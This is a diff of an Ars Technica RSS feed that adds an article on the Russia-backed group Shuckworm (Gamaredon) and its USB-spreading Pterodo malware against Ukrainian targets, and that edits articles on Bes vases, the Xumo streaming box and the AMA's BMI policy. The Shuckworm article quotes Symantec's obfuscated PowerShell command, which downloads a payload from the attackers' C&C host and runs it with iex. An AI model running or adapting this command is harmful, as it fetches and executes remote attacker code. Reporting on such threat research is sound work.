+<p>“The sectors and nature of the organizations and machines targeted may have given the attackers access to significant amounts of sensitive information,” researchers from Symantec, now owned by Broadcom, wrote in a <a href="link">Thursday post</a>. “There were indications in some organizations that the attackers were on the machines of the organizations’ human resources departments, indicating that information about individuals working at the various organizations was a priority for the attackers, among other things.”</p>
+<p>The group, which Symantec tracks as Shuckworm and other researchers call Gamaredon and Armageddon, has been active since 2014 and has been linked to Russia’s FSB, the principal security service in that country. The group focuses solely on obtaining intelligence on Ukrainian targets. In 2020, researchers at security firm SentinelOne <a href="https://www.sentinelone.com/blog/who-are-the-gamaredon-group-and-what-do-they-want/">said</a> the hacking group had “attacked over 5,000 individual entities across the Ukraine, with particular focus on areas where Ukrainian troops are deployed.”</p>
+<p>In February, Shuckworm began deploying new malware and command-and-control infrastructure that has successfully penetrated the defenses of multiple Ukrainian organizations in the military, security services, and government of that country. Group members seem most interested in obtaining information related to sensitive military information that could be abused in Russia’s ongoing invasion.</p>
+<p>This newer campaign debuted new malware in the form of a PowerShell script that spreads Pterodo, a Shuckworm-created backdoor. The script activates when infected USB drives are connected to targeted computers. The malicious script first copies itself onto the targeted machine to create a shortcut file with the extension rtf.lnk. The files have names such as video_porn.rtf.lnk, do_not_delete.rtf.lnk, and evidence.rtf.lnk. The names, which are mostly in the Ukrainian language, are an attempt to entice targets to open the files so they will install Pterodo on machines.</p>
+<p>The script goes on to enumerate all drives connected to the targeted computer and to copy itself to all attached removable drives, most likely in hopes of infecting any air-gapped devices, which are intentionally not connected to the Internet in an attempt to prevent them from being hacked.</p>
+<p>To cover its tracks, Shuckworm has created dozens of variants and rapidly rotated the IP addresses and infrastructure it uses for command and control. The group also uses legitimate services such as Telegram and its micro-blogging platform Telegraph for command and control in another attempt to avoid detection.</p>
+<p>Shuckworm typically uses phishing emails as an initial vector into targets’ computers. The emails contain malicious attachments that masquerade as files with extensions, including .docx, .rar, .sfx, lnk, and hta. Emails often use topics such as armed conflicts, criminal proceedings, combating crime, and protecting children as lures to get targets to open the emails and click on the attachments.</p>
+<p>Symantec researchers said that an infected computer they recovered in the campaign was typical for the way it works. They wrote:</p>
+<blockquote><p>In one victim, the first sign of malicious activity was when the user appeared to open a RAR archive file that was likely delivered via a spear-phishing email and which contained a malicious Document.</p>
+<p>After the document was opened, a malicious PowerShell command was observed being executed to download the next-stage payload from the attackers’ C&amp;C server:</p>
+<p>"CSIDL_SYSTEM\cmd.exe" /c start /min "" powershell -w hidden<br />
+"$gt='/get.'+[char](56+56)+[char](104)+[char](112);$hosta=[char](50+4<br />
+8);[system.net.servicepointmanager]::servercertificatevalidationcallb<br />
+ack={$true};$hosta+='.vafikgo.';$hosta+=[char](57+57);$hosta+=[char](<br />
+60+57);$addrs=[system.net.dns]::gethostbyname($hosta);$addr=$addrs.ad<br />
+dresslist[0];$client=(new-object<br />
+net.webclient);$faddr='htt'+'ps://'+$addr+$gt;$text=$client.downloads<br />
+tring($faddr);iex $text"</p>
+<p>More recently, Symantec has observed Shuckworm leveraging more IP addresses in their PowerShell scripts. This is likely an attempt to evade some tracking methods employed by researchers.</p>
+<p>Shuckworm also continues to update the obfuscation techniques used in its PowerShell scripts in an attempt to avoid detection, with up to 25 new variants of the group’s scripts observed per month between January and April 2023.</p></blockquote>
+<p>Thursday’s post includes IP addresses, hashes, file names, and other indicators of compromise people can use to detect if they have been targeted. The post also warns that the group poses a threat that targets should take seriously.</p>
+<p>“This activity demonstrates that Shuckworm’s relentless focus on Ukraine continues,” they wrote. “It seems clear that Russian nation-state-backed attack groups continue to laser in on Ukrainian targets in attempts to find data that may potentially help their military operations.”</p>
+
+<p><a href="https://arstechnica.com/?p=1947749&comments=1">Read Comments</a></p>]]></content:encoded>
+					
+					<wfw:commentRss>https://arstechnica.com/information-technology/2023/06/russia-backed-hackers-unleash-new-usb-based-malware-on-ukraines-military/feed/</wfw:commentRss>
+			<slash:comments>37</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>For the first time in decades, Congress seems interested in space-based solar power</title>
 		<link>https://arstechnica.com/?p=1947937</link>
 					<comments>https://arstechnica.com/space/2023/06/for-the-first-time-in-decades-congress-seems-interested-space-based-solar-power/#comments</comments>
 		
@@ -68,7 +512,7 @@
 <p><a href="https://arstechnica.com/?p=1947937&comments=1">Read Comments</a></p>]]></content:encoded>
 					
 					<wfw:commentRss>https://arstechnica.com/space/2023/06/for-the-first-time-in-decades-congress-seems-interested-space-based-solar-power/feed/</wfw:commentRss>
-			<slash:comments>11</slash:comments>
+			<slash:comments>205</slash:comments>
 		
 		
 			</item>
@@ -87,11 +531,11 @@
 		<category><![CDATA[psychotropics]]></category>
 		<guid isPermaLink="false">https://arstechnica.com/?p=1947818</guid>
 
-					<description><![CDATA[Blue water lily acts as a sedative, while Syrian rue induces dream-like visions.]]></description>
+					<description><![CDATA[Blue water-lily acts as a sedative, while Syrian rue induces dream-like visions.]]></description>
 										<content:encoded><![CDATA[
 <figure class="intro-image intro-left">
   <img src="https://cdn.arstechnica.net/wp-content/uploads/2023/06/BesVase1CROP-800x541.jpg" alt="Drinking vessel in shape of Bes head"/>
-      <p class="caption" style="font-size:0.8em"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/BesVase1CROP.jpg" class="enlarge-link" data-height="811" data-width="1200">Enlarge</a> <span class="sep">/</span> An Egyptian drinking vessel in the shape of Bes head contained traces of Syrian rue and blue water lily, among other compounds. (credit: Tampa Museum of Art, Florida)</p>  </figure>
+      <p class="caption" style="font-size:0.8em"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/BesVase1CROP.jpg" class="enlarge-link" data-height="811" data-width="1200">Enlarge</a> <span class="sep">/</span> An Egyptian drinking vessel in the shape of Bes head contained traces of Syrian rue and blue water-lily, among other compounds. (credit: Tampa Museum of Art, Florida)</p>  </figure>
 
 
 
@@ -109,7 +553,7 @@
 <div class="image shortcode-img center large"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/BesVase1.jpg"><img alt='Various examples of Bes mugs.'  src="https://cdn.arstechnica.net/wp-content/uploads/2023/06/BesVase1-640x575.jpg" srcset="https://cdn.arstechnica.net/wp-content/uploads/2023/06/BesVase1.jpg 2x" alt='Various examples of Bes mugs.' ></a><p class="caption" style="font-size:0.8em"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/BesVase1.jpg"class="caption-link" rel="nofollow">Various examples of Bes mugs.</a> (credit: D. Tanasi et al., 2023)</p></div>
 <p>Many ceramic vases or similar vessels representing Bes have been found and now populate museums and private collections around the world. Most hypotheses about what the vessels may have held, and the purposes for which they were used, are based on mythological sources. Scholars have suggested they held sacred water, milk, wine, beer, kohl, perfume, or medicinal potions, but few have been tested for traces of organic compounds. One <a href="https://www.semanticscholar.org/paper/Water%2C-milk%2C-beer-and-wine-for-the-living-and-the-%3A-Kaiser/15549228ac3223af9b4613998e9566c0d486972e">2004 study</a> looked for residues of animal proteins in 23 Bes vases, but the DNA analysis turned up just four positive results due to protein degradation and other challenges.</p>
 <p>So the Tampa Museum of Art's Bes vase offered an opportunity to address how such a vase might have been used in Bes-related rituals, per the authors. The museum acquired the vase in 1984 from a private collection; it had been purchased from a gallery in Cairo in 1960. After collecting sample residues from the vessel, Tanasi <em>et al</em>. applied various techniques—including proteomic and genetic analyses and synchrotron radiation-based Fourier-transform infrared microspectroscopy—to characterize the residues.</p>
-<p>Among the more intriguing results was the presence of <a href="https://en.wikipedia.org/wiki/Peganum_harmala">Syrian rue</a> (<em>Peganum harmala</em>), whose seeds are known to have hallucinogenic properties that can induce dream-like visions, per the authors, thanks to its production of the alkaloids harmine and harmaline. There were also traces of <a href="https://en.wikipedia.org/wiki/Nymphaea_nouchali_var._caerulea">blue water lily</a> (<em>Nymphaea cerulea</em>), which contains a psychoactive alkaloid that acts as a sedative; it's one of several candidate plants that scholars believe might be the fruit of the lotus tree described in Homer's <em>Odyssey</em>. Both were known to the Egyptians, and the authors concluded that these two plants "were deliberately used as sources of psychoactive substances for ritual purposes."</p>
+<p>Among the more intriguing results was the presence of <a href="https://en.wikipedia.org/wiki/Peganum_harmala">Syrian rue</a> (<em>Peganum harmala</em>), whose seeds are known to have hallucinogenic properties that can induce dream-like visions, per the authors, thanks to its production of the alkaloids harmine and harmaline. There were also traces of <a href="https://en.wikipedia.org/wiki/Nymphaea_nouchali_var._caerulea">blue water-lily</a> (<em>Nymphaea cerulea</em>), which contains a psychoactive alkaloid that acts as a sedative; it's one of several candidate plants that scholars believe might be the fruit of the lotus tree described in Homer's <em>Odyssey</em>. Both were known to the Egyptians, and the authors concluded that these two plants "were deliberately used as sources of psychoactive substances for ritual purposes."</p>
 <p>In addition, Tanasi <em>et al</em>. identified traces of a fermented alcoholic concoction containing yeasts, wheat, sesame seeds, fruit (possibly grapes), honey, and, um, "human fluids": possibly breast milk, oral or vaginal mucus, and blood. (The traces of human skin were dismissed as likely contamination.) "In light of our results, it would be possible to infer that this Bes vase was used for some sort of ritual of re-enactment of what happened in a significant event in Egyptian myth," the authors wrote. That would be the Myth of the Solar Eye, in which Bes served the goddess <a href="https://en.wikipedia.org/wiki/Hathor">Hathor</a> an alcoholic drink spiked with a plant-based drug to make her fall into a deep sleep and forget about exacting vengeance.</p>
 <p>Also, graffiti refers to Bes as the "giver of oracles" and the "giver of dreams," and one known ritual of the cult involved sleeping in the Saqqara chambers in hopes of having prophetic dreams. The compounds identified in this particular Bes vase would certainly have aided in that objective. However, the authors cautioned that Egyptian belief systems and ritual practices were very complex, and their findings may only apply to this particular vessel. Performing similar analysis on other examples of Bes vases would further enhance our understanding of the purpose of these intriguing artifacts.</p>
 <p>DOI: Research Square, 2023. <a href="http://dx.doi.org/10.21203/rs.3.rs-3000218/v1">10.21203/rs.3.rs-3000218/v1</a>  (<a href="http://arstechnica.com/science/news/2010/03/dois-and-their-discontents-1.ars">About DOIs</a>).</p>
@@ -117,7 +561,7 @@
 <p><a href="https://arstechnica.com/?p=1947818&comments=1">Read Comments</a></p>]]></content:encoded>
 					
 					<wfw:commentRss>https://arstechnica.com/science/2023/06/ancient-egyptian-followers-of-a-deity-called-bes-may-have-used-hallucinogens/feed/</wfw:commentRss>
-			<slash:comments>11</slash:comments>
+			<slash:comments>45</slash:comments>
 		
 		
 			</item>
@@ -129,6 +573,7 @@
 		<dc:creator><![CDATA[Kevin Purdy]]></dc:creator>
 		<pubDate>Wed, 14 Jun 2023 21:31:04 +0000</pubDate>
 				<category><![CDATA[Tech]]></category>
+		<category><![CDATA[Ars Shopping]]></category>
 		<category><![CDATA[Charter]]></category>
 		<category><![CDATA[charter spectrum]]></category>
 		<category><![CDATA[Comcast]]></category>
@@ -146,20 +591,40 @@
 
 
 <div><a name='page-1'></a></div>
-<p>There are an overwhelming number of choices right now for watching streaming media on your TV. Most TVs have a system built in, often Roku, Google, or Samsung. Standalone boxes from Roku, Apple, Google, and Amazon run the third-party market, and smaller vendors offer remarkably cheap Android-based boxes online and at discount retailers.</p>
-<p>But—wait—that's not all. Now Comcast and Charter, the largest and second-largest cable companies in the US, have their own HDMI-box offering. If you've always wanted a box that is stuffed full of "free" ad-stuffed, pseudo-streaming channels, doesn't have the app stores or mirroring capabilities of the major brands, and helps major cable companies regain market position and recoup revenue lost to cord-cutters like you, <a href="https://cordcuttersnews.com/comcast-spectrum-plan-to-take-on-roku-amazon-by-selling-a-streaming-player-at-walmart/?tag=reviewgeek-20&amp;asc_refurl=https://www.reviewgeek.com/155350/these-cable-companies-are-teaming-up-to-sell-a-streaming-box-at-walmart/\">say hello to the Xumo Box</a>.</p>
+<p>Consumers right now are faced with an overwhelming number of choices for watching streaming media on a TV. Most TVs have a system built in, often Roku, Google, or Samsung. Standalone boxes from Roku, Apple, Google, and Amazon rule the third-party market, and smaller vendors offer remarkably cheap Android-based boxes online and at discount retailers.</p>
+<p>But—wait—that's not all. Now <a href="https://fave.co/3XaOtAj" target="_blank" rel="noopener">Comcast</a> and Charter, the largest and second-largest cable companies in the US, have their own HDMI-box offering. If you've always wanted a box full of "free" ad-stuffed, pseudo-streaming channels that doesn't have the app stores or mirroring capabilities of the major brands and helps major cable companies regain market position and recoup revenue lost to cord-cutters like you, <a href="https://cordcuttersnews.com/comcast-spectrum-plan-to-take-on-roku-amazon-by-selling-a-streaming-player-at-walmart/?tag=reviewgeek-20&amp;asc_refurl=https://www.reviewgeek.com/155350/these-cable-companies-are-teaming-up-to-sell-a-streaming-box-at-walmart/\">say hello to the Xumo Box</a>.</p>
 <p>Xumo is the name of <a href="https://play.xumo.com/live-guide/cbs-news">Comcast's free streaming service</a>, purchased by the company in 2020. It's the kind that looks like a cable channel guide and has an endless loop of pre-selected game shows, reality TV, crime procedurals, and other ready-to-license material akin to Pluto and Freevee. Xumo is a big part of <a href="https://www.xfinity.com/learn/flex?cjevent=75804f2a0aed11ee8109524d0a82b832&amp;cjdata=MXxOfDB8WXww">Flex</a>, the streaming box Comcast's Xfinity service offers to customers who don't want a traditional TV plan.</p>
-<p>The Xumo Box is a rebranded Flex, but will be sold in Walmart and other stores in late 2023, as <a href="https://cordcuttersnews.com/comcast-spectrum-plan-to-take-on-roku-amazon-by-selling-a-streaming-player-at-walmart/?tag=reviewgeek-20&amp;asc_refurl=https://www.reviewgeek.com/155350/these-cable-companies-are-teaming-up-to-sell-a-streaming-box-at-walmart/">reported by Cord Cutters</a>. It seems likely to be offered to both Comcast and Charter Spectrum customers, given that Charter <a href="https://corporate.comcast.com/press/releases/comcast-charter-flex-nationwide-streaming-xclass-tv">put $900 million into a joint venture</a> to produce "a variety of branded 4K streaming devices and smart TVs." Cord Cutters suggests the pricing to be "very competitive" with Roku and Fire TV boxes, which can be had for as low as $25 while on sale.</p>
+<p>The Xumo Box is a rebranded <a href="https://fave.co/3P92TyN" target="_blank" rel="noopener">Flex</a> but will be sold in Walmart and other stores in late 2023, as <a href="https://cordcuttersnews.com/comcast-spectrum-plan-to-take-on-roku-amazon-by-selling-a-streaming-player-at-walmart/?tag=reviewgeek-20&amp;asc_refurl=https://www.reviewgeek.com/155350/these-cable-companies-are-teaming-up-to-sell-a-streaming-box-at-walmart/">reported by Cord Cutters</a>. It seems likely to be offered to both Comcast and Charter Spectrum customers, given that Charter <a href="https://corporate.comcast.com/press/releases/comcast-charter-flex-nationwide-streaming-xclass-tv">put $900 million into a joint venture</a> to produce "a variety of branded 4K streaming devices and smart TVs." Cord Cutters suggests the pricing to be "very competitive" with Roku and Fire TV boxes, which can be had for as low as $25 while on sale.</p>
 <p>The existence of a retail box comes shortly after the Xumo venture announced it would provide its free (i.e., ad-supported) <a href="https://thedesk.net/2023/06/xumo-power-free-ad-supported-tcl-channels/">streaming channels on TCL smart TVs</a>. Meanwhile, the Xumo venture aims to also provide its own TVs at some point.</p>
+    <div class="ars-component-layout ars-component-buy-box align-right">
+        <div class="ars-logo-box">
+            <div class="ars-logo-box-content ars-logo-box-content-buy-box">
+                <div class="ars-buy-box">
+                    <div class="ars-buy-box-content">
+                                                <h3 class="ars-buy-box-title">Comcast Xfinity                                                </h3>
+                        <div class="ars-buy-box-button-container">
+                                                            <a class="button button-orange ars-buy-box-button noskim" href="https://fave.co/3XaOtAj" target="_blank">
+                                    Prices vary at Comcast Xfinity                                </a>
+                                                    </div>
+                    </div>
+                </div>
+                                <a class="ars-buy-box-overlay noskim" aria-hidden="true" href="https://fave.co/3XaOtAj" target="_blank"></a>
+                            </div>
+        </div>
+        <div class="ars-component ars-component-affiliate-disclaimer">
+            <div class="ars-affiliate-disclaimer-message">(Ars Technica may earn compensation for sales from links on this post through <a href="/affiliate-link-policy/">affiliate programs</a>.)</div>
+        </div>
+    </div>
+
 <p>From reading reviews of the Flex over the last few years, it has picked up <a href="https://www.xfinity.com/learn/digital-cable-tv/streaming-services?INTCMP=FlexLearn_Flex_ExploreAppsFlex_Flex">many more services</a> while aggressively pushing its Xumo-centric "Free to you" section. Otherwise, it has reportedly decent voice control and a fairly standard "rows of squares" interface. Each streaming service is added by Xfinity, however, rather than being available in an app store akin to what Apple, Google, Amazon, or Roku provide.</p>
-<p>Comcast and Charter aren't likely getting into the streaming hardware business because they're eager to spend hundreds of millions of dollars getting to fifth place. Rather, they've noticed that nearly a third of TVs sold in the U.S. are running Roku's software, that <a href="https://arstechnica.com/gadgets/2023/01/this-spring-roku-will-finally-start-shipping-its-own-tvs/">Roku is making its own TVs</a>, and they see a lot of ads, and customer data, left on the table. Comcast and Charter <a href="https://arstechnica.com/information-technology/2022/08/charter-loses-home-internet-customers-blames-end-of-covid-subsidy-program/">failed to add more Internet customers in mid-2022</a>, a rare result that could have both companies considering revenue diversification.</p>
+<p>Comcast and Charter aren't likely getting into the streaming-hardware business because they're eager to spend hundreds of millions of dollars getting to fifth place. Rather, they've noticed that nearly a third of TVs sold in the US are running Roku's software and that <a href="https://arstechnica.com/gadgets/2023/01/this-spring-roku-will-finally-start-shipping-its-own-tvs/">Roku is making its own TVs</a>. Those Roku TVs also see a lot of ads and customer data left on the table. Comcast and Charter <a href="https://arstechnica.com/information-technology/2022/08/charter-loses-home-internet-customers-blames-end-of-covid-subsidy-program/">failed to add more Internet customers in mid-2022</a>, a rare outcome that could have both companies considering revenue diversification.</p>
 <p>Time will tell if those needing a new streaming box will turn to a new box backed by companies with <a href="https://arstechnica.com/information-technology/2014/05/comcast-time-warner-cable-still-have-the-angriest-customers-survey-finds/">historically tricky brands</a>.</p>
 <p><em>The Advance/Newhouse Partnership, which owns 12.4 percent of Charter, is part of Advance Publications. Advance Publications owns Condé Nast, which owns Ars Technica.</em></p>
 
 <p><a href="https://arstechnica.com/?p=1947856&comments=1">Read Comments</a></p>]]></content:encoded>
 					
 					<wfw:commentRss>https://arstechnica.com/gadgets/2023/06/comcast-and-charter-are-making-a-streaming-box-for-self-loathing-cord-cutters/feed/</wfw:commentRss>
-			<slash:comments>19</slash:comments>
+			<slash:comments>63</slash:comments>
 		
 		
 			</item>
@@ -184,7 +649,7 @@
 		<category><![CDATA[weight]]></category>
 		<guid isPermaLink="false">https://arstechnica.com/?p=1947915</guid>
 
-					<description><![CDATA[The massive medical group says it has some value, but called for a better standard.]]></description>
+					<description><![CDATA[The massive medical group says it has some value but called for a better standard.]]></description>
 										<content:encoded><![CDATA[
 <figure class="intro-image intro-left">
   <img src="https://cdn.arstechnica.net/wp-content/uploads/2023/06/GettyImages-875568858-800x496.jpeg" alt="Body mass index gets smack down: AMA calls out harms and “racist exclusion”"/>
@@ -196,28 +661,28 @@
 
 
 <div><a name='page-1'></a></div>
-<p>Body mass index has for decades been used as a shorthand for assessing body fat and weight-related health risks. But for about just as long, critics have noted the simple calculation is laden with problems; BMI doesn’t actually measure fat mass, account for its distribution, or how those differ by age, gender, ethnicity, race, and how those differences affect health risks. Calculations and cutoffs are largely based on past generations of non-Hispanic white people. And BMI classifications mislead people on their individual risks of disease and death, and can lead to substandard care for eating disorders.</p>
+<p>Body mass index has for decades been used as a shorthand for assessing body fat and weight-related health risks. But for about just as long, critics have noted the simple calculation is laden with problems; BMI doesn’t actually measure fat mass, account for its distribution, or how those differ by age, gender, ethnicity, race, and how those differences affect health risks. Calculations and cutoffs are largely based on past generations of non-Hispanic white people. And BMI classifications mislead people on their individual risks of disease and death and can lead to substandard care for eating disorders.</p>
 <p>Now, it seems the hefty criticism has finally reached a critical mass. During the annual meeting of the American Medical Association (AMA) this week in Chicago, physicians and medical students voted to adopt <a href="https://www.ama-assn.org/system/files/a23-refcomm-d-annotated.pdf">a strongly worded policy</a> acknowledging the calculation's "significant limitations" and "historical harms," including "racist exclusion." While the massive medical group acknowledged that BMI remains useful for population-level trends and associations, the policy called for doctors to become familiar with the calculation's problems and explore alternative measurements for diagnosing obesity and assessing health risks.</p>
-<p>"There are numerous concerns with the way BMI has been used to measure body fat and diagnose obesity, yet some physicians find it to be a helpful measure in certain scenarios," AMA Immediate Past President Jack Resneck, Jr., said in <a href="https://www.ama-assn.org/press-center/press-releases/ama-adopts-new-public-health-policies-improve-health-nation-6">a statement</a>.  "It is important for physicians to understand the benefits and limitations of using BMI in clinical settings to determine the best care for their patients."</p>
+<p>"There are numerous concerns with the way BMI has been used to measure body fat and diagnose obesity, yet some physicians find it to be a helpful measure in certain scenarios," AMA Immediate Past President Jack Resneck, Jr., said in <a href="https://www.ama-assn.org/press-center/press-releases/ama-adopts-new-public-health-policies-improve-health-nation-6">a statement</a>. "It is important for physicians to understand the benefits and limitations of using BMI in clinical settings to determine the best care for their patients."</p>
 <h2>History</h2>
-<p>The shift will likely inspire cheers from critics, who have been increasing for decades. Even before the rise of BMI— aka the Quetelet Index as it was called in the 1970s—medical researchers had realized that simple features like leg length, bone mass, and body frame influenced weight-to-height ratios.</p>
+<p>The shift will likely inspire cheers from critics, whose numbers have been increasing for decades. Even before the rise of BMI—aka the Quetelet Index as it was called in the 1970s—medical researchers had realized that simple features like leg length, bone mass, and body frame influenced weight-to-height ratios.</p>
 <p>BMI is a simple calculation of weight in kilograms divided by height in meters squared. In 1993, an expert advisory committee for the World Health Organization came up with four BMI-based weight categories: underweight (below 20), normal weight (20 to 24.9), overweight (25 to 29.9), and obese (30 and up). In the US then, the National Institutes of Health considered the threshold for overweight to be a BMI of 27.8  for men or 27.3 for women. Anything under those cutoffs was "normal." This was based on an 85 percent cutoff point from data in a large national NIH survey. But in 1998, the NIH lowered the cutoff to 25, aligning with WHO categories. And overnight, millions of Americans went from having normal weight to overweight. <a href="https://www.cdc.gov/healthyweight/assessing/bmi/adult_bmi/index.html#InterpretedAdults">That cutoff is still used</a>.</p>
 <p>BMI is a simple, easy-to-obtain number that has strong, established associations with body fatness, morbidity, and mortality data. But on an individual level, it's loaded with limitations. For one, it doesn't actually measure body fat mass—it can't distinguish lean mass from fat.</p>
 <div><a name='page-2'></a></div>
 <h2>Disadvantages</h2>
 <p>In <a href="https://www.ama-assn.org/system/files/a23-handbook-refcom-d.pdf">a report prepared by an AMA council</a> before the vote, council members noted that updated data from a national NIH survey compared BMI to body fat percentages based on bioelectric impedance. In subjects all with a BMI of 25, the percent of body fat in men varied between 14 percent and 35 percent, and in women, it varied between 26 percent and 43 percent, the report noted. Based on the NIH's criteria for defining obesity based on percent of body fat, subjects with the same BMI—which was at the cutoff for overweight—were associated with a body fat mass that varied between "low normal" to "obese."</p>
-<p>BMI also doesn't account for fat distribution and a person's life stage. For decades, researchers have noted that the accumulation of fat in the upper part of the body ("apple-shaped" body) is linked to higher risks of diseases, like coronary heart disease and diabetes, compared to when fat accumulates in the lower body ("pear-shaped" body). Hormonal changes in puberty may be linked to some fat distribution differences. For instance, females generally develop fat stores around their pelvis and thigh during puberty, which is not seen in males, who develop a relatively larger amount of lean mass during puberty. And as women age, they tend to lose bone and muscle mass. Thus, as the AMA report notes, a 65-year-old woman who weighs the same as she did when she was 25 will actually have a higher percentage of body fat than she has in the past.</p>
-<p>Beyond gender, racial and ethnic minorities also have different weight-related health risks. For example, <a href="https://pubmed.ncbi.nlm.nih.gov/16801583/">a 2006 study</a> found that Asian women had more than double the risk of developing diabetes than white women who had the same BMI. Other studies have also noted that Asians have higher risks of cardiovascular disease at the same BMIs as white Europeans. One possible explanation is differences in fat mass. <a href="https://pubmed.ncbi.nlm.nih.gov/12164465/">A 2002 study</a> found that, when compared to white Europeans of the same BMI, Asian people have 3 percent to 5 percent higher body fat. In contrast, <a href="https://pubmed.ncbi.nlm.nih.gov/17342075/">a 2007 study</a> suggested that Black women have higher lean mass than white women.</p>
-<p>The AMA report also noted that BMI doesn't account for other factors that can significantly affect health, such as family history of disease, genetic factors, smoking, excessive alcohol use, mental health, stability of body weight, medication-induced obesity, and a person's occupation. The simple BMI-based cutoffs for underweight can miss eating disorders, and the AMA notes that an "overemphasis of bodily thinness is as deleterious to one's physical and mental health as obesity."</p>
+<p>BMI also doesn't account for fat distribution and a person's life stage. For decades, researchers have noted that the accumulation of fat in the upper part of the body ("apple-shaped" body) is linked to higher risks of diseases, like coronary heart disease and diabetes, compared to when fat accumulates in the lower body ("pear-shaped" body). Hormonal changes in puberty may be linked to some fat distribution differences. For instance, females generally develop fat stores around their pelvis and thigh during puberty, which is not seen in males, who develop a relatively larger amount of lean mass during puberty. And as women age, they tend to lose bone and muscle mass. Thus, as the AMA report notes, a 65-year-old woman who weighs the same as she did when she was 25 will actually have a higher percentage of body fat than she had in the past.</p>
+<p>Beyond gender, racial and ethnic minorities also have different weight-related health risks. For example, <a href="https://pubmed.ncbi.nlm.nih.gov/16801583/">a 2006 study</a> found that Asian women had more than double the risk of developing diabetes than white women who had the same BMI. Other studies have also noted that Asians have higher risks of cardiovascular disease at the same BMIs as white Europeans. One possible explanation is differences in fat mass. <a href="https://pubmed.ncbi.nlm.nih.gov/12164465/">A 2002 study</a> found that, when compared to white Europeans of the same BMI, Asian people have 3 percent to 5 percent higher body fat. By contrast, <a href="https://pubmed.ncbi.nlm.nih.gov/17342075/">a 2007 study</a> suggested that Black women have higher lean mass than white women.</p>
+<p>The AMA report also noted that BMI doesn't account for other factors that can significantly affect health, such as family history of disease, genetic factors, smoking, excessive alcohol use, mental health, stability of body weight, medication-induced obesity, and a person's occupation. The simple BMI-based cutoffs for underweight can miss eating disorders, and the AMA notes that an "overemphasis on bodily thinness is as deleterious to one's physical and mental health as obesity."</p>
 <h2>Alternatives</h2>
 <p>To move away from the harms and limitations of BMI, the AMA calls for researchers to become familiar with alternative ways of assessing fat and research these as potential new standards. These include: abdominal circumference measurements; waist-to-hip ratio; skinfold measurements; an empirical mathematical model called the Visceral Adiposity Index; a linear equation for the relative fat mass, which is based on a height-to-waist ratio; underwater weighting to look at body density (hydrostatic weighting); and air displacement plethysmography (aka Bod Pod).</p>
 <p>There's also bioelectrical impedance, which models the body as five cylinders of mass (the trunk and four limbs) and estimates body fat mass. Last, there's a variety of imaging methods including dual-energy X-ray absorptiometry (DXA), computed tomography (CT) scans, and magnetic resonance imaging (MRI). The combination of CT and MRI scans is currently considered the gold standard for body composition analysis, the AMA notes.</p>
-<p>In all, the AMA's new policy acknowledges "the significant limitations associated with the widespread use of BMI in clinical settings and suggests its use be in a conjunction with other valid measures of risk."</p>
+<p>In all, the AMA's new policy acknowledges "the significant limitations associated with the widespread use of BMI in clinical settings and suggests its use be in conjunction with other valid measures of risk."</p>
 
 <p><a href="https://arstechnica.com/?p=1947915&comments=1">Read Comments</a></p>]]></content:encoded>
 					
 					<wfw:commentRss>https://arstechnica.com/health/2023/06/american-medical-assoc-blasts-bmi-for-historical-harm-racist-exclusion/feed/</wfw:commentRss>
-			<slash:comments>58</slash:comments>
+			<slash:comments>248</slash:comments>
 		
 		
 			</item>
@@ -279,7 +744,7 @@
 <p><a href="https://arstechnica.com/?p=1947867&comments=1">Read Comments</a></p>]]></content:encoded>
 					
 					<wfw:commentRss>https://arstechnica.com/tech-policy/2023/06/report-microsoft-launched-bing-chatbot-despite-openai-warning-it-wasnt-ready/feed/</wfw:commentRss>
-			<slash:comments>29</slash:comments>
+			<slash:comments>65</slash:comments>
 		
 		
 			</item>
@@ -327,7 +792,7 @@
 <p><a href="https://arstechnica.com/?p=1947841&comments=1">Read Comments</a></p>]]></content:encoded>
 					
 					<wfw:commentRss>https://arstechnica.com/gadgets/2023/06/microsoft-adds-pricey-diy-surface-repair-parts-to-online-store/feed/</wfw:commentRss>
-			<slash:comments>23</slash:comments>
+			<slash:comments>46</slash:comments>
 		
 		
 			</item>
@@ -387,7 +852,7 @@
 <p><a href="https://arstechnica.com/?p=1947845&comments=1">Read Comments</a></p>]]></content:encoded>
 					
 					<wfw:commentRss>https://arstechnica.com/science/2023/06/ibm-compensates-for-errors-gets-usable-results-out-of-quantum-processor/feed/</wfw:commentRss>
-			<slash:comments>18</slash:comments>
+			<slash:comments>35</slash:comments>
 		
 		
 			</item>
@@ -440,7 +905,7 @@
 <p><a href="https://arstechnica.com/?p=1947706&comments=1">Read Comments</a></p>]]></content:encoded>
 					
 					<wfw:commentRss>https://arstechnica.com/space/2023/06/vulcan-rocket-completes-critical-test-but-launch-slipping-toward-end-of-2023/feed/</wfw:commentRss>
-			<slash:comments>52</slash:comments>
+			<slash:comments>70</slash:comments>
 		
 		
 			</item>
@@ -502,7 +967,7 @@
 <p><a href="https://arstechnica.com/?p=1947761&comments=1">Read Comments</a></p>]]></content:encoded>
 					
 					<wfw:commentRss>https://arstechnica.com/tech-policy/2023/06/google-may-soon-be-ordered-to-break-up-its-lucrative-ad-business-eu-warns/feed/</wfw:commentRss>
-			<slash:comments>117</slash:comments>
+			<slash:comments>151</slash:comments>
 		
 		
 			</item>
@@ -567,7 +1032,7 @@
 <p><a href="https://arstechnica.com/?p=1947752&comments=1">Read Comments</a></p>]]></content:encoded>
 					
 					<wfw:commentRss>https://arstechnica.com/tech-policy/2023/06/comcast-complains-to-fcc-that-listing-all-of-its-monthly-fees-is-too-hard/feed/</wfw:commentRss>
-			<slash:comments>191</slash:comments>
+			<slash:comments>227</slash:comments>
 		
 		
 			</item>
@@ -609,7 +1074,7 @@
 <p><a href="https://arstechnica.com/?p=1947743&comments=1">Read Comments</a></p>]]></content:encoded>
 					
 					<wfw:commentRss>https://arstechnica.com/gaming/2023/06/federal-judge-temporarily-blocks-microsoft-activision-deal/feed/</wfw:commentRss>
-			<slash:comments>77</slash:comments>
+			<slash:comments>102</slash:comments>
 		
 		
 			</item>
@@ -661,7 +1126,7 @@
 <p><a href="https://arstechnica.com/?p=1947734&comments=1">Read Comments</a></p>]]></content:encoded>
 					
 					<wfw:commentRss>https://arstechnica.com/science/2023/06/satellites-keep-photobombing-spaces-images-astronomers-need-a-fix/feed/</wfw:commentRss>
-			<slash:comments>103</slash:comments>
+			<slash:comments>132</slash:comments>
 		
 		
 			</item>
@@ -706,7 +1171,7 @@
